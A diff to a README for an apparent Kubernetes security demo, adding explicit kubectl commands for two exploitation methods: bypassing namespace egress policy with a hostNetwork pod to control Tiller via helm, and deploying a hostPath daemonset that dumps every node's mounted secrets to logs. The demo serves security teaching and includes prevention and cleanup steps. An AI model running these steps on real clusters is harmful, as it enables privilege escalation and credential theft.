@@ -153,41 +153,88 @@ This scenario demonstrates the potential for privilege escalation and network po
 
 ```console
 kubectl apply -f demo1/installation.yaml # To ensure Tiller is installed
-kubectl apply -f demo2/installation.yaml # SA, RBAC, and network policy
+kubectl apply -f demo2/installation.yaml # RBAC and default ns network policy
 ```
 
 ### Exploitation (Method 1)
 
 1. Show access to the `default` namespace but not to `kube-system` to create pods.
-2. Run a `kubectl apply -f demo2/hostnetwork.yaml` to deploy a host network pod that bypasses network egress policy on the namespace.
-3. Download the `helm` client binary and run `helm ls` to show that it can control Tiller.
+
+```console
+kubectl auth can-i --as demo@example.com create pods -n kube-system
+```
+
+```console
+kubectl auth can-i --as demo@example.com create pods -n default
+```
+
+2. Deploy a simple pod
+
+```console
+kubectl --as demo@example.com apply -f demo2/simplepod.yaml
+```
+
+3. Get a shell in the pod:
+
+```console
+kubectl --as demo@example.com exec -it simplepod -- /bin/sh
+```
+
+4. Attempt to reach `tiller` directly:
+
+```console
+wget -qO - tiller-deploy.kube-system:44134
+exit
+```
+
+5. Deploy a hostnetwork pod that bypasses network egress policy on the namespace.
+
+```console
+kubectl --as demo@example.com apply -f demo2/hostnetwork.yaml
+```
+
+6. Exec in, download the `helm` client binary and run `helm ls` to show that it can control Tiller.
+
+```console
+kubectl --as demo@example.com exec -it hostnetwork -- /bin/sh
+```
+
+```console
+export PATH=/tmp:$PATH; cd /tmp; wget -qO helm.tar.gz https://get.helm.sh/helm-v2.16.1-linux-amd64.tar.gz; tar zxvf helm.tar.gz; chmod +x linux-amd64/helm; cp linux-amd64/helm .
+```
+
+```console
+export HELM_HOST=tiller-deploy.kube-system.svc.cluster.local:44134; helm ls
+```
 
 ### Exploitation (Method 2)
 
 1. Show access to the `default` namespace but not to `kube-system` to create pods.
 
 ```console
-kubectl auth can-i -n kube-system create pods
-kubectl auth can-i -n default create pods
+kubectl auth can-i --as demo@example.com create pods -n kube-system
 ```
 
+```console
+kubectl auth can-i --as demo@example.com create pods -n default
+```
 
 2. Deploy the host path daemonset that reads all mounted secrets contents from all nodes into stdout
 
 ```console
-kubectl apply -f demo2/daemonset.yaml
+kubectl --as demo@example.com apply -f demo2/daemonset.yaml
 ```
 
 3. Read the secrets in stdout.
 
 ```console
-kubectl logs -f daemonset/secret-logger --all-containers=true --since=1m
+kubectl --as demo@example.com logs -f daemonset/secret-logger --all-containers=true --since=1m
 ```
 
 4. Cleanup
 
 ```console
-kubectl delete -f demo2/daemonset.yaml
+kubectl --as demo@example.com delete -f demo2/daemonset.yaml
 ```
 
 ### Prevention
@@ -203,8 +250,8 @@ kubectl delete -f demo2/daemonset.yaml
 ## Cleanup
 
 ```console
-kubectl delete -f demo1/pod.yaml
 kubectl delete -f demo1/installation.yaml
+kubectl delete -f demo2/simplepod.yaml
 kubectl delete -f demo2/hostnetwork.yaml
 kubectl delete -f demo2/daemonset.yaml
 kubectl delete -f demo2/installation.yaml
